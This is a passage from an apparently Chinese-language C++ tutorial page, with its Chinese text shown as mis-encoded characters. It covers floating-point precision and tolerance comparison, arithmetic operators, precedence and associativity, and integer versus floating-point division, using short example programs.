<strong>è¡¨ç¤ºå°æ•°:</strong> å¯ä»¥è¡¨ç¤ºæ•´æ•°æ— æ³•è¡¨ç¤ºçš„å°æ•°éƒ¨åˆ†ã€‚</li><li> <strong>æ ‡å‡†åŒ–:</strong> å¤§å¤šæ•°ç°ä»£è®¡ç®—æœºéƒ½éµå¾ª IEEE 754 æ ‡å‡†æ¥è¡¨ç¤ºå’Œå¤„ç†æµ®ç‚¹æ•°ï¼Œè¿™æé«˜äº†å¯ç§»æ¤æ€§ã€‚</li></ol><p><strong>ç¼ºç‚¹:</strong></p><ol><li> <strong>ç²¾åº¦é™åˆ¶:</strong> æµ®ç‚¹æ•°åªèƒ½<strong>è¿‘ä¼¼</strong>åœ°è¡¨ç¤ºå¤§å¤šæ•°å®æ•°ã€‚ç”±äºå†…éƒ¨ä½¿ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºï¼ŒæŸäº›åœ¨åè¿›åˆ¶ä¸‹çœ‹èµ·æ¥å¾ˆç²¾ç¡®çš„å°æ•°ï¼ˆå¦‚ 0.1ï¼‰åœ¨äºŒè¿›åˆ¶æµ®ç‚¹è¡¨ç¤ºä¸­å¯èƒ½æ˜¯æ— é™å¾ªç¯å°æ•°ï¼Œåªèƒ½å­˜å‚¨ä¸€ä¸ªè¿‘ä¼¼å€¼ã€‚è¿™ä¼šå¯¼è‡´å¾®å°çš„**èˆå…¥è¯¯å·® (Rounding Error)**ã€‚</li><li> <strong>æ¯”è¾ƒå›°éš¾:</strong> ç”±äºç²¾åº¦é™åˆ¶ï¼Œç›´æ¥ä½¿ç”¨ <code>==</code> æ¥æ¯”è¾ƒä¸¤ä¸ªæµ®ç‚¹æ•°æ˜¯å¦ç›¸ç­‰é€šå¸¸æ˜¯ä¸å¯é çš„ã€‚å¾®å°çš„èˆå…¥è¯¯å·®å¯èƒ½å¯¼è‡´é€»è¾‘ä¸Šåº”è¯¥ç›¸ç­‰çš„ä¸¤ä¸ªæ•°åœ¨å†…éƒ¨è¡¨ç¤ºä¸Šç•¥æœ‰ä¸åŒã€‚æ¯”è¾ƒæµ®ç‚¹æ•°æ—¶ï¼Œé€šå¸¸åº”è¯¥æ£€æŸ¥å®ƒä»¬çš„å·®å€¼æ˜¯å¦åœ¨ä¸€ä¸ªå¾ˆå°çš„<strong>å®¹å·® (Tolerance)</strong> èŒƒå›´å†…ã€‚</li><li> <strong>è¿ç®—é€Ÿåº¦:</strong> æµ®ç‚¹è¿ç®—é€šå¸¸æ¯”æ•´å‹è¿ç®—æ…¢ï¼ˆå°½ç®¡ç°ä»£å¤„ç†å™¨æœ‰ä¸“é—¨çš„æµ®ç‚¹å•å…ƒæ¥ä¼˜åŒ–ï¼‰ã€‚</li><li> <strong>ç‰¹æ®Šå€¼:</strong> IEEE 754 æ ‡å‡†å®šä¹‰äº†ä¸€äº›ç‰¹æ®Šå€¼ï¼Œå¦‚ <code>NaN</code> (Not a Numberï¼Œä¾‹å¦‚ 0.0/0.0 çš„ç»“æœ) å’Œæ— ç©·å¤§ (<code>Infinity</code>ï¼Œä¾‹å¦‚ 1.0/0.0 çš„ç»“æœ)ï¼Œéœ€è¦åœ¨ä½¿ç”¨æ—¶æ³¨æ„å¤„ç†ã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (ç²¾åº¦é—®é¢˜å’Œæ¯”è¾ƒ):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;   // ä¸ºäº† fabs (è®¡ç®—ç»å¯¹å€¼)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // ä¸ºäº† setprecision</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ç²¾åº¦é—®é¢˜ç¤ºä¾‹</span></span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">0.2</span>;</span><br><span class="line">    <span class="keyword">double</span> sum = a + b; <span class="comment">// ç†è®ºä¸Šåº”è¯¥æ˜¯ 0.3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">20</span>); <span class="comment">// æ˜¾ç¤ºæ›´å¤šå°æ•°ä½</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a + b = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºå¯èƒ½ä¸æ˜¯ç²¾ç¡®çš„ 0.3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sum == <span class="number">0.3</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (==): sum is equal to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (==): sum is NOT equal to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¾ˆå¯èƒ½æ‰§è¡Œè¿™é‡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­£ç¡®çš„æ¯”è¾ƒæ–¹æ³•ï¼šæ£€æŸ¥å·®å€¼æ˜¯å¦åœ¨å®¹å·®èŒƒå›´å†…</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> TOLERANCE = <span class="number">1e-9</span>; <span class="comment">// å®šä¹‰ä¸€ä¸ªå¾ˆå°çš„å®¹å·®å€¼</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">fabs</span>(sum - <span class="number">0.3</span>) &lt; TOLERANCE) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (tolerance): sum is close enough to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åº”è¯¥æ‰§è¡Œè¿™é‡Œ</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (tolerance): sum is NOT close enough to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦ä¸€ä¸ªä¾‹å­</span></span><br><span class="line">    <span class="keyword">float</span> x = <span class="number">1.0f</span> / <span class="number">3.0f</span>;</span><br><span class="line">    <span class="keyword">float</span> y = <span class="number">3.0f</span> * x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = 3.0f * (1.0f / 3.0f) = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¯èƒ½ä¸æ˜¯ç²¾ç¡®çš„ 1.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong> åœ¨ä½¿ç”¨æµ®ç‚¹æ•°æ—¶ï¼Œè¦æ„è¯†åˆ°å®ƒä»¬æ˜¯è¿‘ä¼¼å€¼ï¼Œå¹¶é¿å…ç›´æ¥è¿›è¡Œç›¸ç­‰æ€§æ¯”è¾ƒã€‚åœ¨éœ€è¦ç²¾ç¡®è®¡ç®—ï¼ˆå¦‚é‡‘èè®¡ç®—ï¼‰çš„åœºåˆï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨ä¸“é—¨çš„åº“æˆ–å®šç‚¹æ•°è¡¨ç¤ºæ³•ã€‚å¯¹äºå¤§å¤šæ•°ç§‘å­¦å’Œå·¥ç¨‹è®¡ç®—ï¼Œ<code>double</code> æä¾›äº†è¶³å¤Ÿçš„ç²¾åº¦å’ŒèŒƒå›´ã€‚</p><h2 id="3-4-C-ç®—æœ¯è¿ç®—ç¬¦"><a href="#3-4-C-ç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="3.4 C++ç®—æœ¯è¿ç®—ç¬¦"></a>3.4 C++ç®—æœ¯è¿ç®—ç¬¦</h2><p>C++æä¾›äº†ä¸°å¯Œçš„è¿ç®—ç¬¦æ¥æ‰§è¡Œç®—æœ¯è®¡ç®—ã€‚æœ¬èŠ‚å°†ä»‹ç»åŸºæœ¬çš„ç®—æœ¯è¿ç®—ç¬¦ã€å®ƒä»¬çš„ä¼˜å…ˆçº§å’Œç»“åˆæ€§ã€æ•´æ•°é™¤æ³•å’Œæ±‚æ¨¡è¿ç®—ã€ç±»å‹è½¬æ¢ä»¥åŠ C++11 å¼•å…¥çš„ <code>auto</code> ç±»å‹æ¨æ–­ã€‚</p><p><strong>åŸºæœ¬ç®—æœ¯è¿ç®—ç¬¦:</strong></p><ul><li>  <code>+</code>: åŠ æ³• (Addition)</li><li>  <code>-</code>: å‡æ³• (Subtraction)</li><li>  <code>*</code>: ä¹˜æ³• (Multiplication)</li><li>  <code>/</code>: é™¤æ³• (Division)</li><li>  <code>%</code>: æ±‚æ¨¡ (Modulo) æˆ–æ±‚ä½™ (Remainder)</li></ul><p>è¿™äº›è¿ç®—ç¬¦å¯ä»¥ç”¨äº C++ çš„æ‰€æœ‰æ•°å€¼ç±»å‹ï¼ˆæ•´å‹å’Œæµ®ç‚¹å‹ï¼‰ï¼Œä½†æ±‚æ¨¡è¿ç®—ç¬¦ <code>%</code> é€šå¸¸åªç”¨äºæ•´æ•°ç±»å‹ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">15.50</span>;</span><br><span class="line">    <span class="keyword">double</span> tax_rate = <span class="number">0.08</span>;</span><br><span class="line">    <span class="keyword">int</span> quantity = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> total_items = <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">int</span> items_per_box = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ æ³•</span></span><br><span class="line">    <span class="keyword">double</span> total_price = price * quantity + <span class="number">5.0</span>; <span class="comment">// å‡è®¾æœ‰ 5 å…ƒé™„åŠ è´¹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total price (with fee): &quot;</span> &lt;&lt; total_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‡æ³•</span></span><br><span class="line">    <span class="keyword">double</span> price_before_tax = price / (<span class="number">1</span> + tax_rate); <span class="comment">// å‡è®¾ price å·²å«ç¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price before tax: &quot;</span> &lt;&lt; price_before_tax &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹˜æ³•</span></span><br><span class="line">    <span class="keyword">double</span> tax_amount = price_before_tax * tax_rate;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tax amount: &quot;</span> &lt;&lt; tax_amount &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é™¤æ³• (æµ®ç‚¹æ•°)</span></span><br><span class="line">    <span class="keyword">double</span> average_price = total_price / quantity;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average price per item: &quot;</span> &lt;&lt; average_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é™¤æ³• (æ•´æ•°) - è§ 3.4.2</span></span><br><span class="line">    <span class="keyword">int</span> full_boxes = total_items / items_per_box; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Full boxes: &quot;</span> &lt;&lt; full_boxes &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ±‚æ¨¡ - è§ 3.4.3</span></span><br><span class="line">    <span class="keyword">int</span> remaining_items = total_items % items_per_box;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Remaining items: &quot;</span> &lt;&lt; remaining_items &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸€å…ƒå‡æ³• (å–è´Ÿ)</span></span><br><span class="line">    <span class="keyword">double</span> discount = <span class="number">-10.0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Discount: &quot;</span> &lt;&lt; discount &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸€å…ƒåŠ æ³• (é€šå¸¸æ— æ•ˆæœ)</span></span><br><span class="line">    <span class="keyword">double</span> positive_value = +price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Positive value: &quot;</span> &lt;&lt; positive_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-1-è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§"><a href="#3-4-1-è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§" class="headerlink" title="3.4.1 è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§"></a>3.4.1 è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§</h3><p>å½“ä¸€ä¸ªè¡¨è¾¾å¼ä¸­åŒ…å«å¤šä¸ªè¿ç®—ç¬¦æ—¶ï¼Œ<strong>ä¼˜å…ˆçº§ (Precedence)</strong> å’Œ <strong>ç»“åˆæ€§ (Associativity)</strong> å†³å®šäº†è¿ç®—çš„æ‰§è¡Œé¡ºåºã€‚</p><ul><li>  <strong>ä¼˜å…ˆçº§:</strong> å“ªä¸ªè¿ç®—ç¬¦å…ˆæ‰§è¡Œã€‚ä¼˜å…ˆçº§é«˜çš„è¿ç®—ç¬¦å…ˆäºä¼˜å…ˆçº§ä½çš„è¿ç®—ç¬¦æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œä¹˜æ³•å’Œé™¤æ³•çš„ä¼˜å…ˆçº§é«˜äºåŠ æ³•å’Œå‡æ³•ã€‚</li><li><strong>ç»“åˆæ€§:</strong> å½“å¤šä¸ªå…·æœ‰ç›¸åŒä¼˜å…ˆçº§çš„è¿ç®—ç¬¦è¿ç»­å‡ºç°æ—¶ï¼Œå®ƒä»¬çš„æ‰§è¡Œé¡ºåºã€‚<ul><li>  <strong>å·¦ç»“åˆæ€§ (Left-to-Right):</strong> è¿ç®—ä»å·¦å‘å³æ‰§è¡Œã€‚å¤§å¤šæ•°äºŒå…ƒç®—æœ¯è¿ç®—ç¬¦ï¼ˆ<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>ï¼‰éƒ½æ˜¯å·¦ç»“åˆçš„ã€‚ä¾‹å¦‚ <code>a - b + c</code> ç­‰ä»·äº <code>(a - b) + c</code>ã€‚</li><li>  <strong>å³ç»“åˆæ€§ (Right-to-Left):</strong> è¿ç®—ä»å³å‘å·¦æ‰§è¡Œã€‚èµ‹å€¼è¿ç®—ç¬¦ <code>=</code> å’Œä¸€å…ƒè¿ç®—ç¬¦ï¼ˆå¦‚å–è´Ÿ <code>-</code>ï¼‰æ˜¯å³ç»“åˆçš„ã€‚ä¾‹å¦‚ <code>a = b = c</code> ç­‰ä»·äº <code>a = (b = c)</code>ã€‚</li></ul></li></ul><p><strong>å¸¸è§ç®—æœ¯è¿ç®—ç¬¦ä¼˜å…ˆçº§ (ç”±é«˜åˆ°ä½):</strong></p><ol><li> ä¸€å…ƒè¿ç®—ç¬¦: <code>+</code> (æ­£å·), <code>-</code> (è´Ÿå·) - (å³ç»“åˆ)</li><li> ä¹˜æ³•ã€é™¤æ³•ã€æ±‚æ¨¡: <code>*</code>, <code>/</code>, <code>%</code> - (å·¦ç»“åˆ)</li><li> åŠ æ³•ã€å‡æ³•: <code>+</code>, <code>-</code> - (å·¦ç»“åˆ)</li><li> èµ‹å€¼è¿ç®—ç¬¦: <code>=</code> - (å³ç»“åˆ)</li></ol><p><strong>ä½¿ç”¨æ‹¬å·:</strong> å¯ä»¥ä½¿ç”¨åœ†æ‹¬å· <code>()</code> æ¥è¦†ç›–é»˜è®¤çš„ä¼˜å…ˆçº§å’Œç»“åˆæ€§ï¼Œå¼ºåˆ¶æŒ‰ç‰¹å®šé¡ºåºæ‰§è¡Œè¿ç®—ã€‚æ‹¬å·å†…çš„è¡¨è¾¾å¼æ€»æ˜¯æœ€å…ˆè®¡ç®—ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>, b = <span class="number">8</span>, c = <span class="number">3</span>, d = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä¼˜å…ˆçº§: * é«˜äº +</span></span><br><span class="line">    <span class="keyword">int</span> result1 = a + b * c; <span class="comment">// ç­‰ä»·äº a + (b * c) = 5 + (8 * 3) = 5 + 24 = 29</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a + b * c = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨æ‹¬å·æ”¹å˜é¡ºåº</span></span><br><span class="line">    <span class="keyword">int</span> result2 = (a + b) * c; <span class="comment">// (5 + 8) * 3 = 13 * 3 = 39</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(a + b) * c = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»“åˆæ€§ (å·¦ç»“åˆ): / å’Œ * ä¼˜å…ˆçº§ç›¸åŒ</span></span><br><span class="line">    <span class="keyword">int</span> result3 = b / c * d; <span class="comment">// ç­‰ä»·äº (b / c) * d = (8 / 3) * d = 2 * d = 2 * 2 = 4 (æ•´æ•°é™¤æ³•)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b / c * d = &quot;</span> &lt;&lt; result3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»“åˆæ€§ (å³ç»“åˆ): èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">int</span> x, y, z;</span><br><span class="line">    x = y = z = <span class="number">10</span>; <span class="comment">// ç­‰ä»·äº x = (y = (z = 10))</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x=&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y=&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, z=&quot;</span> &lt;&lt; z &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º x=10, y=10, z=10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»“åˆæ€§ (å³ç»“åˆ): ä¸€å…ƒè´Ÿå·</span></span><br><span class="line">    <span class="keyword">int</span> val = - - <span class="number">5</span>; <span class="comment">// ç­‰ä»·äº -(-5) = 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- - 5 = &quot;</span> &lt;&lt; val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®:</strong> å½“è¡¨è¾¾å¼å¤æ‚æˆ–ä¼˜å…ˆçº§ä¸æ˜ç¡®æ—¶ï¼Œä½¿ç”¨æ‹¬å·æ¥æ˜ç¡®è¿ç®—é¡ºåºï¼Œå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å¹¶é¿å…é”™è¯¯ã€‚</p><h3 id="3-4-2-é™¤æ³•åˆ†æ”¯"><a href="#3-4-2-é™¤æ³•åˆ†æ”¯" class="headerlink" title="3.4.2 é™¤æ³•åˆ†æ”¯"></a>3.4.2 é™¤æ³•åˆ†æ”¯</h3><p>C++ çš„é™¤æ³•è¿ç®—ç¬¦ <code>/</code> çš„è¡Œä¸ºå–å†³äºå…¶<strong>æ“ä½œæ•° (Operand)</strong> çš„ç±»å‹ï¼š</p><ol><li> <strong>æµ®ç‚¹æ•°é™¤æ³•:</strong> å¦‚æœæ“ä½œæ•°ä¸­è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯æµ®ç‚¹ç±»å‹ (<code>float</code>, <code>double</code>, <code>long double</code>)ï¼Œåˆ™æ‰§è¡Œæµ®ç‚¹æ•°é™¤æ³•ï¼Œç»“æœä¹Ÿæ˜¯æµ®ç‚¹ç±»å‹ï¼ŒåŒ…å«å°æ•°éƒ¨åˆ†ã€‚</li><li> <strong>æ•´æ•°é™¤æ³•:</strong> å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½æ˜¯æ•´æ•°ç±»å‹ (<code>int</code>, <code>short</code>, <code>long</code>, <code>char</code>, <code>bool</code> ç­‰)ï¼Œåˆ™æ‰§è¡Œæ•´æ•°é™¤æ³•ã€‚ç»“æœåªä¿ç•™å•†çš„æ•´æ•°éƒ¨åˆ†ï¼Œå°æ•°éƒ¨åˆ†è¢«**æˆªæ–­ (truncated)**ï¼ˆç›´æ¥ä¸¢å¼ƒï¼Œä¸æ˜¯å››èˆäº”å…¥ï¼‰ã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æµ®ç‚¹æ•°é™¤æ³•</span></span><br><span class="line">    <span class="keyword">double</span> result_f1 = <span class="number">9.0</span> / <span class="number">5.0</span>; <span class="comment">// ä¸¤ä¸ª double</span></span><br><span class="line">    <span class="keyword">double</span> result_f2 = <span class="number">9.0</span> / <span class="number">5</span>;   <span class="comment">// ä¸€ä¸ª double, ä¸€ä¸ª int (int è¢«æå‡ä¸º double)</span></span><br><span class="line">    <span class="keyword">double</span> result_f3 = <span class="number">9</span> / <span class="number">5.0</span>;   <span class="comment">// ä¸€ä¸ª int, ä¸€ä¸ª double (int è¢«æå‡ä¸º double)</span></span><br><span class="line">    <span class="keyword">float</span> result_f4 = <span class="number">9.0f</span> / <span class="number">5.0f</span>; <span class="comment">// ä¸¤ä¸ª float</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0 / 5.0 = &quot;</span> &lt;&lt; result_f1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0 / 5   = &quot;</span> &lt;&lt; result_f2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9 / 5.0   = &quot;</span> &lt;&lt; result_f3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0f / 5.0f = &quot;</span> &lt;&lt; result_f4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1.8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 